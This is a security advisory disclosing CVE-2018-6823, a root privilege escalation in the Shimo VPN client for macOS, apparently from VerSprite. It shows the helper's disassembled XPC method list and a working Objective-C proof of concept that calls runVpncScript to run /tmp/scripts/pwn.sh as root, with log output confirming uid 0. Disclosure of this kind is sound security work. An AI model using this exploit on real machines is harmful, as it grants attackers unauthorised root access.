### [VS-2018-001] Shimo VPN Client for MacOS Root Privilege Escalation Vulnerability 

```
Download: https://www.shimovpn.com/download/
CVE: CVE-2018-6823
Author: Benjamin Watson of VerSprite Security
Affected: < 4.1.5.1 
```

#### Vulnerability Details

The Shimo VPN Client's `com.feingeist.shimo.helper` tool LaunchDaemon implements 
an unprotected XPC service that can be abused to execute scripts as root. Shimo's NSXPC service protocol defines the following method
`-[ShimoHelperTool runVpncScript:withReason:withReply:]` within its list of exported methods.

```nasm
__objc_const:0000000100017DD0 _OBJC_INSTANCE_METHODS_ShimoHelperToolProtocol __objc2_meth_list <18h, 15h>
__objc_const:0000000100017DD0                                         ; DATA XREF: __data:_OBJC_PROTOCOL_$_ShimoHelperToolProtocolâ†“o
__objc_const:0000000100017DD8                 __objc2_meth <offset sel_setShimoBundlePath_, offset aV240816, 0> ; "setShimoBundlePath:" ...
__objc_const:0000000100017DF0                 __objc2_meth <offset sel_setTmpDirPath_, offset aV240816, 0> ; "setTmpDirPath:" ...
__objc_const:0000000100017E08                 __objc2_meth <offset sel_connectOpenVPNWithConfig_withManagementPort_withReply_,\ ; "connectOpenVPNWithConfig:withManagement"... ...
__objc_const:0000000100017E08                               offset aV400816q2432, 0>
__objc_const:0000000100017E20                 __objc2_meth <offset sel_connectVPNCWithConfig_withComPort_withReply_,\ ; "connectVPNCWithConfig:withComPort:withR"... ...
__objc_const:0000000100017E20                               offset aV400816q2432, 0>
__objc_const:0000000100017E38                 __objc2_meth <offset sel_connectPPPWithConfig_withCredentials_withComPort_requiresRacoon_withReply_,\ ; "connectPPPWithConfig:withCredentials:wi"... ...
__objc_const:0000000100017E38                               offset aV52081624q32c4, 0>
__objc_const:0000000100017E50                 __objc2_meth <offset sel_connectSSHWithConfig_toHost_withCredentials_withComPort_withReply_,\ ; "connectSSHWithConfig:toHost:withCredent"... ...
__objc_const:0000000100017E50                               offset aV5608162432q40, 0>
__objc_const:0000000100017E68                 __objc2_meth <offset sel_connectRacoonToHost_withCredentials_withComPort_withReply_,\ ; "connectRacoonToHost:withCredentials:wit"... ...
__objc_const:0000000100017E68                               offset aV48081624q3240, 0>
__objc_const:0000000100017E80                 __objc2_meth <offset sel_connectOpenConnectWithConfig_toHost_withCredentials_withHash_withComPort_withReply_,\ ; "connectOpenConnectWithConfig:toHost:wit"... ...
__objc_const:0000000100017E80                               offset aV640816243240q, 0>
__objc_const:0000000100017E98                 __objc2_meth <offset sel_disconnectService_fromRemoteHost_withComPort_withPID_withReply_,\ ; "disconnectService:fromRemoteHost:withCo"... ...
__objc_const:0000000100017E98                               offset aV5208q1624q32i, 0>
__objc_const:0000000100017EB0                 __objc2_meth <offset sel_writeConfig_atPath_withReply_, \ ; "writeConfig:atPath:withReply:" ...
__objc_const:0000000100017EB0                               offset aV4008162432_0, 0>
__objc_const:0000000100017EC8                 __objc2_meth <offset sel_deleteConfigAtPath_withReply_, \ ; "deleteConfigAtPath:withReply:" ...
__objc_const:0000000100017EC8                               offset aV32081624, 0>
__objc_const:0000000100017EE0                 __objc2_meth <offset sel_updateNameServerAddresses_searchDomains_defaultDomain_forServiceIdentifier_withReply_,\ ; "updateNameServerAddresses:searchDomains"... ...
__objc_const:0000000100017EE0                               offset aV5608162432404, 0>
__objc_const:0000000100017EF8                 __objc2_meth <offset sel_reloadRacoonConfigWithReply_, \ ; "reloadRacoonConfigWithReply:" ...
__objc_const:0000000100017EF8                               offset aV240816_0, 0>
__objc_const:0000000100017F10                 __objc2_meth <offset sel_terminateRacoonDaemonWithReply_, \ ; "terminateRacoonDaemonWithReply:" ...
__objc_const:0000000100017F10                               offset aV240816_0, 0>
__objc_const:0000000100017F28                 __objc2_meth <offset sel_configureRoutingWithCommand_withReply_, \ ; "configureRoutingWithCommand:withReply:" ...
__objc_const:0000000100017F28                               offset aV32081624, 0>
__objc_const:0000000100017F40                 __objc2_meth <offset sel_loadKernelExtensions_withReply_, \ ; "loadKernelExtensions:withReply:" ...
__objc_const:0000000100017F40                               offset aV3208q1624, 0>
__objc_const:0000000100017F58                 __objc2_meth <offset sel_unloadKernelExtensions_withReply_, \ ; "unloadKernelExtensions:withReply:" ...
__objc_const:0000000100017F58                               offset aV3208q1624, 0>
__objc_const:0000000100017F70                 __objc2_meth <offset sel_cleanKnownHostsForRemoteHost_withReply_, \ ; "cleanKnownHostsForRemoteHost:withReply:" ...
__objc_const:0000000100017F70                               offset aV32081624, 0>
__objc_const:0000000100017F88                 __objc2_meth <offset sel_cleanSystem_withReply_, offset aV3208q1624, \ ; "cleanSystem:withReply:" ...
__objc_const:0000000100017F88                               0>
__objc_const:0000000100017FA0                 __objc2_meth <offset sel_runVpncScript_withReason_withReply_, \ ; "runVpncScript:withReason:withReply:" ...
__objc_const:0000000100017FA0                               offset aV4008162432_0, 0>
__objc_const:0000000100017FB8                 __objc2_meth <offset sel_setTimeMachineEnabled_withReply_, \ ; "setTimeMachineEnabled:withReply:" ...
__objc_const:0000000100017FB8                               offset aV2808c1620, 0>
```
This method is responsible for running scripts from a directory passed to it from the NSXPC client via `NSTask`.

#### Exploitation

#### PoC

```objc
@protocol ShimoHelperToolProtocol

- (void)setShimoBundlePath:(id)path;
- (void)runVpncScript:(id)param1 withReason:(id)withReason withReply:(id)withReply;

@end

NSXPCConnection *connection = [[NSXPCConnection alloc] initWithMachServiceName:@"com.feingeist.shimo.helper" options:NSXPCConnectionPrivileged];
connection.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(ShimoHelperToolProtocol)];
NSLog(@"[+] NSXPCConnection established -> %@ [!]", connection);
connection.interruptionHandler = ^{
    NSLog(@"Connection Terminated");
};
connection.invalidationHandler = ^{
    NSLog(@"Connection Invalidated");
};
[connection resume];
//[[connection remoteObjectProxy] setShimoBundlePath:@"/tmp"];
[[connection remoteObjectProxy] runVpncScript:@"/tmp/scripts/pwn.sh" withReason:@"causeifuckingsaidso" withReply:NULL];

```

```
default	11:09:51.751816 -0500	com.feingeist.shimo.helper	Running vpnc script '/tmp/scripts/pwn.sh' in helper with reason 'causeifuckingsaidso'.
default	11:09:51.774506 -0500	syslog	uid=0(root) gid=0(wheel) groups=0(wheel),1(daemon),2(kmem),3(sys),4(tty),5(operator),8(procview),9(procmod),12(everyone),20(staff),29(certusers),61(localaccounts),80(admin),701(com.apple.sharepoint.group.1),33(_appstore),98(_lpadmin),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh)

```
